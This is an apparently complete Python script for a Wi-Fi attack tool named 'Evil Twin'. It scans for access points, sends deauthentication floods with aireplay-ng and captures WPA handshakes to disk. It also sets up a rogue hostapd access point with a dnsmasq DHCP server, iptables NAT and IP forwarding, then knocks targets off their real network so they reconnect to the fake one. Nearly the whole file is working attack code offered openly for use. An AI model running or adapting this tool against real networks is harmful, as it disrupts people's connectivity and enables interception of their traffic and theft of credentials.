import ipaddress
import pyric.pyw as pyw
from multiprocessing import Process
from scapy.all import *
from prettytable import PrettyTable
from os import system
from signal import signal, SIGTERM
from scapy.layers.dot11 import Dot11Elt, Dot11, Dot11Beacon, Dot11ProbeResp, RadioTap


def choose_interface():
    interface_names = pyw.winterfaces()
    if interface_names is None:
        print("No wireless interfaces found.")
        return None

    print(f"Available interfaces:\n")
    for index, interface in enumerate(interface_names):
        print(f"{index + 1}: {interface}")

    while True:
        selected_interface_index = input("Select an interface: ")
        if selected_interface_index.isnumeric():
            selected_interface_index = int(selected_interface_index)
            if selected_interface_index < 1 or selected_interface_index > len(interface_names):
                print("Invalid selection.")
            else:
                selected_interface = interface_names[selected_interface_index - 1]
                w = pyw.getcard(selected_interface)
                break
        else:
            print('Invalid selection.')
    return selected_interface, w


def check_band(interface):
    pinfo = pyw.phyinfo(interface)
    if len(pinfo['bands']) == 2:
        return True
    else:
        return False


def change_to_monitor_mode(interface):
    pyw.down(interface)
    pyw.modeset(interface, 'monitor')
    pyw.up(interface)


def scan_using_scapy():
    try:
        p1 = Process(target=hopper)
        p2 = Process(target=scan_for_ap)
        p1.start()
        p2.start()
        p1.join()
        p2.join()
    except KeyboardInterrupt:
        scan_dir = os.path.join('scan')
        if not os.path.exists(scan_dir):
            os.makedirs(scan_dir)
        with open(f'{scan_dir}/scan-{datetime.now().strftime("%d-%m-%y-%H:%M:%S")}.csv', 'w',
                  newline='') as scan_output:
            scan_output.write(ap_table.get_csv_string())
        p1.terminate()
        p2.terminate()


def to_csv(*args):
    scan_dir = os.path.join('scan')
    if not os.path.exists(scan_dir):
        os.makedirs(scan_dir)
    with open(f'{scan_dir}/scan-{datetime.now().strftime("%d-%m-%y-%H:%M:%S")}.csv', 'w', newline='') as scan_output:
        scan_output.write(ap_table.get_csv_string(sortby='SSID'))
    sys.exit(0)


def scan_for_ap():
    while True:
        sniff(iface=selected_interface, prn=insert_ap, store=False,
              lfilter=lambda p: (Dot11Beacon in p or Dot11ProbeResp in p))


def hopper():
    while True:
        for i in channel_list:
            system(f'iwconfig {selected_interface} channel {i} 2> /dev/null')
            time.sleep(0.1)


def insert_ap(pkt):
    bssid = pkt[Dot11].addr3
    if bssid in aps:
        return
    p = pkt[Dot11Elt]
    cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
    ssid, channel = None, None
    crypto = set()
    freq = pkt[RadioTap].Channel
    if freq // 1000 == 5:
        channel = (freq - 5000) // 5
    else:
        channel = (freq - 2407) // 5
        if channel == 15:
            channel = 14
    while isinstance(p, Dot11Elt):
        if p.ID == 0:
            ssid = str(p.info).strip("'")[2:]
            if ssid == '':
                ssid = '<length = 0>'
        elif p.ID == 48:
            crypto.add("WPA2")
        elif p.ID == 221 and p.info.startswith(b'\x00P\xf2\x01\x01\x00'):
            crypto.add("WPA")
        p = p.payload
    if not crypto:
        if 'privacy' in cap:
            crypto.add("WEP")
        else:
            crypto.add("OPN")
    aps[bssid] = (ssid, channel, crypto)
    ap_table.add_row((ssid, bssid, channel, ' / '.join(crypto)))
    system('clear')
    print("Press Ctrl + C to stop scanning")
    print(ap_table.get_string(sortby='SSID'))
    signal(SIGTERM, to_csv)


def scan_using_airodump():
    if check_band(w0):
        system(f"gnome-terminal -- bash -c 'airodump-ng {selected_interface} --band ab;exec bash'")
    else:
        system(f"gnome-terminal -- bash -c 'airodump-ng {selected_interface};exec bash'")


def crafting_deauth(stat):
    print('Crafting de-authentication packet.')
    target_mac = 'ff:ff:ff:ff:ff:ff'
    ap_mac = ''
    channel = ''
    count = 100
    iface = selected_interface
    headers = ('No.', 'Requirements', 'Value')
    table = PrettyTable(headers)
    table.add_rows([
        ['1', 'Target MAC', target_mac],
        ['2', 'BSSID', ap_mac],
        ['3', 'Channel', channel],
        ['4', 'Count', count],
        ['5', 'Interface', iface]
    ])
    print(table)
    while True:
        ap_mac = input("Input BSSID: ")
        if re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", ap_mac.lower()):
            break
        else:
            print('Wrong format')
    while True:
        system('clear')
        table.clear_rows()
        table.add_rows([
            ['1', 'Target MAC', target_mac],
            ['2', 'BSSID', ap_mac],
            ['3', 'Channel', channel],
            ['4', 'Count', count],
            ['5', 'Interface', iface]
        ])
        print(table)
        opt = input("Select value to change (type 'start' to start attack): ")
        if opt == '1':
            while True:
                target_mac = input("Target MAC: ")
                if re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", target_mac.lower()):
                    break
                else:
                    print('Wrong format')
        elif opt == '2':
            while True:
                ap_mac = input("BSSID: ")
                if re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", ap_mac.lower()):
                    break
                else:
                    print('Wrong format')
        elif opt == '3':
            while True:
                try:
                    channel = int(input('Channel: '))
                    if channel != '':
                        break
                    else:
                        print('Wrong input.')
                except ValueError:
                    print("Wrong input.")
        elif opt == '4':
            while True:
                try:
                    count = int(input('Number of packet will be sent: '))
                    if count != '':
                        break
                    else:
                        print('Wrong input.')
                except ValueError:
                    print('Wrong input.')
        elif opt == '5':
            if stat == 0:
                print("Can't change interface")
            elif stat == 1:
                interface_names = pyw.winterfaces()
                if interface_names is None:
                    print("No wireless interfaces found.")
                    return None

                print(f"Available interfaces:\n")
                for index, interface in enumerate(interface_names):
                    print(f"{index + 1}: {interface}")

                while True:
                    selected_interface_index = input("Select an interface: ")
                    if selected_interface_index.isnumeric():
                        selected_interface_index = int(selected_interface_index)
                        if selected_interface_index < 1 or selected_interface_index > len(interface_names):
                            print("Invalid selection.")
                        else:
                            iface = interface_names[selected_interface_index - 1]
                            w1 = pyw.getcard(iface)
                            break
                    else:
                        print('Invalid selection.')
        elif opt == 'start':
            if channel != '':
                if stat == 1:
                    return target_mac, ap_mac, channel, count, table, iface, w1
                elif stat == 0:
                    return target_mac, ap_mac, channel, count
            else:
                print('Missing channel')
        else:
            print('Wrong input.')


def monitor_target(ap_mac, channel):
    system(
        f"gnome-terminal -- bash -c 'airodump-ng {selected_interface} --bssid {ap_mac} --channel {channel};exec bash'")


def deauth_attack():
    target_mac, ap_mac, channel, count = crafting_deauth(0)
    system(f'iwconfig {selected_interface} channel {channel}')
    system(f'aireplay-ng -0 {count} -a {ap_mac} -c {target_mac} {selected_interface}')
    print('\n')


def capture_handshake():
    target_mac, ap_mac, channel, count = crafting_deauth(0)
    handshake_dir = os.path.join('handshakes', ap_mac)
    if not os.path.exists(handshake_dir):
        os.makedirs(handshake_dir)
    handshake_file = os.path.join(handshake_dir, ap_mac)
    # subprocess.run(['airmon-ng', 'start', selected_interface, str(channel)], stdout=subprocess.DEVNULL)
    system(
        f"gnome-terminal -- bash -c 'airodump-ng {selected_interface} --bssid {ap_mac} --channel {channel} --write {handshake_file};exec bash'")
    system(
        f'aireplay-ng --deauth {count} -a {ap_mac} -c {target_mac} {selected_interface}')
    print(f'\nHandshake is saved at {handshake_dir}')


def attacking_phase():
    while True:
        system('clear')
        print(banner)
        opt = input(
            """
1. Scan for target using Airodump-ng
2. Scan for target using Scapy
3. Monitor target
4. De-authentication attack
5. Capture handshake
6. Evil twin attack 
Type 'exit' to exit
Choose an option: """)
        if opt == '1':
            scan_using_airodump()
        elif opt == '4':
            deauth_attack()
        elif opt == '5':
            capture_handshake()
        elif opt == '6':
            evil_twin()
        elif opt == '2':
            scan_using_scapy()
        elif opt == '3':
            while True:
                ap_mac = input("BSSID: ")
                if re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", ap_mac.lower()):
                    break
                else:
                    print('Wrong format')
            while True:
                channel = input('Channel: ')
                if channel == '':
                    print("Can't be blank")
                elif channel.isnumeric():
                    break
                else:
                    print('Has to be number')
            monitor_target(ap_mac, channel)
        elif opt == 'exit':
            pyw.down(w0)
            pyw.modeset(w0, 'managed')
            pyw.up(w0)
            exit(0)
        else:
            print('Wrong input.')


def create_hostapd_config():
    hostapd_headers = ('No.', 'Requirement', 'Value')
    hostapd_config = PrettyTable(hostapd_headers)
    ssid = ''
    standard = ''
    channel = ''
    sec_standard = ''
    interface = selected_interface
    hostapd_config.add_rows([
        [1, 'Interface', interface],
        [2, 'SSID', ssid],
        [3, 'Standard', standard],
        [4, 'Channel', channel],
        [5, 'Security standard', sec_standard]
    ])
    print(hostapd_config)
    while True:
        print("Type 'finish' write the configurations.")
        hostapd_opt = input('Choose an option: ')
        if hostapd_opt == '1':
            print('C')
        elif hostapd_opt == '2':
            while True:
                ssid = input("Access point SSID: ")
                if ssid == '':
                    print("SSID can't be blank")
                else:
                    system('clear')
                    hostapd_config.clear_rows()
                    hostapd_config.add_rows([
                        [1, 'Interface', interface],
                        [2, 'SSID', ssid],
                        [3, 'Standard', standard],
                        [4, 'Channel', channel],
                        [5, 'Security standard', sec_standard]
                    ])
                    print(hostapd_config)
                    break
        elif hostapd_opt == '3':
            standard_headers = ['Standard', 'Band', 'Maximum data rate', 'Input']
            standard_table = PrettyTable(standard_headers)
            standard_table.add_rows([
                ['802.11b', '2.4 GHz', '11 Mbps', 'b'],
                ['802.11a', '5 GHz', '54 Mbps', 'a'],
                ['802.11g', '2.4 GHz', '54 Mbps', 'g'],
                ['802.11n', '2.4 GHz\n5 GHz', '450 Mbps', 'gn\nan'],
            ])
            print(standard_table)
            print("Check the adapter capabilities before choosing. The command 'iw list' can be use.")
            while True:
                hw_input = input("Operational mode: ")
                if hw_input == 'b' or hw_input == 'a' or hw_input == 'g':
                    hw_mode = hw_input
                    standard = f'802.11{hw_input}'
                    system('clear')
                    hostapd_config.clear_rows()
                    hostapd_config.add_rows([
                        [1, 'Interface', interface],
                        [2, 'SSID', ssid],
                        [3, 'Standard', standard],
                        [4, 'Channel', channel],
                        [5, 'Security standard', sec_standard]
                    ])
                    print(hostapd_config)
                    break
                elif hw_input == 'gn':
                    hw_mode = 'g\nieee80211n=1\nht_capab=[HT40-][SHORT-GI-20][SHORT-GI-40]\nwmm_enabled=1'
                    standard = '802.11n (2.4 GHz)'
                    system('clear')
                    hostapd_config.clear_rows()
                    hostapd_config.add_rows([
                        [1, 'Interface', interface],
                        [2, 'SSID', ssid],
                        [3, 'Standard', standard],
                        [4, 'Channel', channel],
                        [5, 'Security standard', sec_standard]
                    ])
                    print(hostapd_config)
                    break
                elif hw_input == 'an':
                    hw_mode = 'a\nieee80211n=1\nht_capab=[HT40-][SHORT-GI-20][SHORT-GI-40]\nwmm_enabled=1'
                    standard = '802.11n (5 GHz)'
                    system('clear')
                    hostapd_config.clear_rows()
                    hostapd_config.add_rows([
                        [1, 'Interface', interface],
                        [2, 'SSID', ssid],
                        [3, 'Standard', standard],
                        [4, 'Channel', channel],
                        [5, 'Security standard', sec_standard]
                    ])
                    print(hostapd_config)
                    break
                else:
                    print('Wrong input.')
        elif hostapd_opt == '4':
            channel_headers = ('Band', 'Available channels')
            channel_table = PrettyTable(channel_headers)
            channel_table.add_rows([
                ['2.4 GHz', '1-14'],
                ['5 GHz', '36 - 64 increment of 4\n100 - 144 increment of 4']
            ])
            print(channel_table)
            print("Check the adapter capabilities before choosing. The command 'iw list' can be use.")
            while True:
                channel_input = input('Channel: ')
                if channel_input.isnumeric():
                    channel = channel_input
                    system('clear')
                    hostapd_config.clear_rows()
                    hostapd_config.add_rows([
                        [1, 'Interface', interface],
                        [2, 'SSID', ssid],
                        [3, 'Standard', standard],
                        [4, 'Channel', channel],
                        [5, 'Security standard', sec_standard]
                    ])
                    print(hostapd_config)
                    break
                else:
                    print('Must be a number')
        elif hostapd_opt == '5':
            auth_headers = ('Option', 'Security standard')
            auth_table = PrettyTable(auth_headers)
            auth_table.add_rows([
                ['1', 'Open'],
                ['2', 'WPA'],
                ['3', 'WPA 2'],
            ])
            print(auth_table)
            while True:
                auth_option = input('Choose an option: ')
                if auth_option.isnumeric():
                    if auth_option == '1':
                        auth = '0'
                        sec_standard = 'Open network'
                        system('clear')
                        hostapd_config.clear_rows()
                        hostapd_config.add_rows([
                            [1, 'Interface', interface],
                            [2, 'SSID', ssid],
                            [3, 'Standard', standard],
                            [4, 'Channel', channel],
                            [5, 'Security standard', sec_standard]
                        ])
                        print(hostapd_config)
                        break
                    if auth_option == '2' or auth_option == '3':
                        while True:
                            passphrase = input('Password: ')
                            if len(passphrase) < 8:
                                print('Password need to be at least 8 characters long.')
                            else:
                                break
                        if auth_option == '2':
                            auth = (f"1\nwpa_passphrase={passphrase}\nwpa_key_mgmt=WPA-PSK\n"
                                    f"wpa_pairwise=TKIP")
                            sec_standard = 'WPA'
                        else:
                            auth = (f"2\nwpa_passphrase={passphrase}\nwpa_key_mgmt=WPA-PSK\n"
                                    f"wpa_pairwise=TKIP\nrsn_pairwise=CCMP")
                            sec_standard = 'WPA2'
                        system('clear')
                        hostapd_config.clear_rows()
                        hostapd_config.add_rows([
                            [1, 'Interface', interface],
                            [2, 'SSID', ssid],
                            [3, 'Standard', standard],
                            [4, 'Channel', channel],
                            [5, 'Security standard', sec_standard],
                            [6, 'Password', passphrase]
                        ])
                        print(hostapd_config)
                        break
                else:
                    print('Wrong input.')
        elif hostapd_opt == '6' and (sec_standard == 'WPA' or sec_standard == 'WPA2'):
            while True:
                passphrase = input('Password: ')
                if len(passphrase) < 8:
                    print('Password need to be at least 8 characters long.')
                else:
                    system('clear')
                    hostapd_config.clear_rows()
                    hostapd_config.add_rows([
                        [1, 'Interface', interface],
                        [2, 'SSID', ssid],
                        [3, 'Standard', standard],
                        [4, 'Channel', channel],
                        [5, 'Security standard', sec_standard],
                        [6, 'Password', passphrase]
                    ])
                    print(hostapd_config)
                    break
        elif hostapd_opt == 'finish':
            if ssid == '' or standard == '' or channel == '' or sec_standard == '' or hw_mode == '' or auth == '':
                print('Missing requirement(s)')
            else:
                break
        else:
            print('Wrong input.')

    hostapd_conf = f"""### Event logger
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2

### 802.11 config
ssid={ssid}
ignore_broadcast_ssid=0
channel={channel}
interface={interface}
hw_mode={hw_mode}
auth_algs=1
wpa={auth}
macaddr_acl=0
"""
    config_dir = os.path.join('config')
    if not os.path.exists(config_dir):
        os.makedirs(config_dir)
    hostapd_file = open(f'{config_dir}/hostapd.conf', 'w')
    hostapd_file.write(hostapd_conf)
    hostapd_file.close()
    config_path = config_dir + '/hostapd.conf'
    return config_path, hostapd_config


def create_dnsmasq_config():
    dnsmasq_header = ('No', 'Requirement', 'Value')
    dnsmasq_table = PrettyTable(dnsmasq_header)
    ip_dhcp = ipaddress.IPv4Address('192.168.0.1')
    dhcp_pool = 30
    dns = '8.8.8.8'
    netmask = '255.255.255.0'
    ip_list = list(ipaddress.IPv4Network('192.168.0.0/24').hosts())
    dnsmasq_table.add_rows([
        ['1', 'Interface', selected_interface],
        ['2', 'IP', ip_dhcp],
        ['3', 'Netmask', netmask],
        ['4', 'DHCP pool', dhcp_pool],
        ['5', 'DNS server', dns]
    ])
    print('Configure DHCP server')
    print(dnsmasq_table)
    opt = input("Type 'finish' to write to config file\nChoose an option: ")

    while True:
        if opt == 'finish':
            break
        elif opt.isnumeric():
            if opt == '1':
                print("Can't change interface.")
            elif opt == '2' or opt == '3':
                while True:
                    ip = input('Input IP (ip/prefix): ')
                    try:
                        if re.match('[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}[/][0-9]{1,2}', ip):
                            ipaddress.ip_network(ip)
                            ip_list = list(ipaddress.IPv4Network(ip).hosts())
                            ip_dhcp = ip_list[0]
                            if dhcp_pool > len(ip_list) - 1:
                                dhcp_pool = len(ip_list) - 1
                            netmask = ipaddress.IPv4Network(ip).netmask
                            dnsmasq_table.clear_rows()
                            dnsmasq_table.add_rows([
                                ['1', 'Interface', selected_interface],
                                ['2', 'IP', ip_dhcp],
                                ['3', 'Netmask', netmask],
                                ['4', 'DHCP pool', dhcp_pool],
                                ['5', 'DNS server', dns]
                            ])
                            system('clear')
                            print('Configure DHCP server')
                            print(dnsmasq_table)
                            opt = input("Type 'finish' to write to config file\nChoose an option: ")
                            break
                        else:
                            raise ValueError
                    except ValueError:
                        print('Wrong ip network format')
            elif opt == '4':
                while True:
                    dhcp_pool = int(input('Input number of hosts: '))
                    if dhcp_pool > len(ip_list) - 1 or dhcp_pool < 2:
                        dhcp_pool = len(ip_list) - 1
                        dnsmasq_table.clear_rows()
                        dnsmasq_table.add_rows([
                            ['1', 'Interface', selected_interface],
                            ['2', 'IP', ip_dhcp],
                            ['3', 'Netmask', netmask],
                            ['4', 'DHCP pool', dhcp_pool],
                            ['5', 'DNS server', dns]
                        ])
                        system('clear')
                        print('Configure DHCP server')
                        print(dnsmasq_table)
                        opt = input("Type 'finish' to write to config file\nChoose an option: ")
                        break
                    else:
                        dnsmasq_table.clear_rows()
                        dnsmasq_table.add_rows([
                            ['1', 'Interface', selected_interface],
                            ['2', 'IP', ip_dhcp],
                            ['3', 'Netmask', netmask],
                            ['4', 'DHCP pool', dhcp_pool],
                            ['5', 'DNS server', dns]
                        ])
                        system('clear')
                        print('Configure DHCP server')
                        print(dnsmasq_table)
                        opt = input("Type 'finish' to write to config file\nChoose an option: ")
                        break
            elif opt == '5':
                while True:
                    ip = input('Input DNS IP: ')
                    try:
                        ipaddress.ip_network(ip)
                    except ValueError:
                        print('Wrong ip format')
                    else:
                        dns = ip
                        dnsmasq_table.clear_rows()
                        dnsmasq_table.add_rows([
                            ['1', 'Interface', selected_interface],
                            ['2', 'IP', ip_dhcp],
                            ['3', 'Netmask', netmask],
                            ['4', 'DHCP pool', dhcp_pool],
                            ['5', 'DNS server', dns]
                        ])
                        system('clear')
                        print('Configure DHCP server')
                        print(dnsmasq_table)
                        opt = input("Type 'finish' to write to config file\nChoose an option: ")
                        break
            elif opt == 'finish':
                break
            else:
                print('Wrong input!')
    dnsmasq_conf = f"""interface={selected_interface}
dhcp-option=3,{ip_dhcp}
dhcp-option=6,{ip_dhcp}
dhcp-range={ip_dhcp + 1}, {ip_dhcp + dhcp_pool + 1}, {netmask}, 12h
server={dns}
listen-address=127.0.0.1
log-queries
log-dhcp
"""
    config_dir = os.path.join('config')
    if not os.path.exists(config_dir):
        os.makedirs(config_dir)
    dns_file = open(f'{config_dir}/dnsmasq.conf', 'w')
    dns_file.write(dnsmasq_conf)
    dns_file.close()
    config_path = config_dir + "/dnsmasq.conf"
    return config_path, ip_dhcp, dnsmasq_table


def evil_twin():
    ap_file, hostapd_table = create_hostapd_config()
    dns_file, ip, dns_table = create_dnsmasq_config()
    target_mac, ap_mac, channel, count, deauth_table, iface, w1 = crafting_deauth(1)
    system('clear')
    print(f'Hostapd config:\n{hostapd_table}')
    print(f'Dnsmasq config:\n{dns_table}')
    print(f'De-authentication packet:\n{deauth_table}')
    while True:
        option = input("Type 'start' to start the attack, 'cancel' to cancel, 'exit' to exit.\nChoose an option: ")
        if option == 'start':
            system(f"gnome-terminal -- bash -c 'hostapd {ap_file};exec bash'")
            system(f'ifconfig {selected_interface} {ip}')
            system('iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE')
            system(f'iptables --append FORWARD --in-interface {selected_interface} -j ACCEPT')
            system('sysctl -w net.ipv4.ip_forward=1')
            system(f"gnome-terminal -- bash -c 'dnsmasq -C {dns_file} -d;exec bash'")
            change_to_monitor_mode(w1)
            system(f'iwconfig {iface} channel {channel}')
            system(f'aireplay-ng -0 {count} -a {ap_mac} -c {target_mac} {iface}')
            time.sleep(20)
            break
        elif option == 'cancel':
            break
        elif option == 'exit':
            pyw.down(w0)
            pyw.modeset(w0, 'managed')
            pyw.up(w0)
            exit(0)
        else:
            print('Wrong input.')


def get_channel(interface):
    pinfo = pyw.phyinfo(interface)
    for d in pinfo['bands']:
        for i in pinfo['bands'][d]['rfs']:
            base = 2407
            if i // 1000 == 5:
                base = 5000
            channel = (i - base) // 5
            if channel == 15:
                channel = 14
            channel_list.append(channel)


if __name__ == "__main__":
    ap_headers = ("SSID", "BSSID", "Channel", "Encryption")
    ap_table = PrettyTable(ap_headers)
    aps = {}
    lmac = []
    lssid = []
    lencrypt = []
    lchannel = []
    channel_list = []
    pic = """
                                 .:--===++++++===-                  
                             .-==++===============*.                 
                           -++======+**++++++***===*=:               
                         =+==-======*-==++++=-=*===#-=*=             
                      .=*===========++++===+**#+==+*====*:           
                    +%%=+==========+**######*+++++#==---=*-.         
                   -%%*-#==---==*+*+#++++##**#+--+=#---=*+%**        
                  =%%%==*==-----*+*#******#%***+=+**---*=-=##-       
            :====#@%%%*##+++++==++#+*####*++#+++**=--=++---%#=       
            =%@*+--..::=:..::.+++=+#++++++*+#:::****+==*+-=#%-       
       :-==+%%%%%##%%*-+==+==++*=+*%++++==+*%=:::=*+*++*+*##+        
       %%%@%%%%%%%%@%%=--:=*+--*=*-%*======+%=:::::+*#*=**=.         
       %@%@%%%%%%%%@##+.-..:...=++-#*+++++++#-::::::-#=+*:           
       -#***+*%##+.  =...::.....*=*#%*=====+*-::::=*+%*=             
                     ---=------:=*%%+=++*=++=--=+*+++.               
                      ++-==-=+=*%##=**=:=-..-+*++*++                 
                      .-+=+**##++-+**=**=*+*+=*+-..+                 
                       .+=%%*+=-=----#*+++**+=:....=                 
                      .+--=+-==:=:=-:-=***..........-                
                      -==-==--*:-=--:=*+=+.......-==+===.            
                      ==++-+:=-=--+-:-*==*=..:+#%%%%%%%%%+*-         
                      :==-:=---=+:-:.:+-=+=*%%%%%%%%%%%%%%%%#+-.     
                       .-:=:-:..++-:-****%%%%%%%%%%%%%%%%%%%#*+=-    
                              :%%%%%%%%%%%%%%%%%%%%%#+==-:.          
                             .%%%%%%%%%%%%%%%%#*+-.                  
                             :%%#######**+=-:.                       

    """
    banner = """
    #######  ### ###   ######  ###                ######  ### ###   ######  ##  ###   #####   
    ### ###  ### ###     ##    ###                # ## #  ### ###     ##    ### ###  ###  ##  
    ###      ### ###     ##    ###                  ##    ### ###     ##    #######  ###      
    #####    ### ###     ##    ###                  ##    ### ###     ##    #######   #####   
    ###      ### ###     ##    ###                  ##    #######     ##    ### ###       ##  
    ### ###   #####      ##    ###  ##              ##    ### ###     ##    ### ###  ###  ##  
    #######    ###     ######  #######              ##    ##   ##   ######  ### ###   ##### 
        """
    try:
        print(pic + banner)
        selected_interface, w0 = choose_interface()
        get_channel(w0)
        change_to_monitor_mode(w0)
        system('clear')
        attacking_phase()
    except KeyboardInterrupt:
        exit(0)
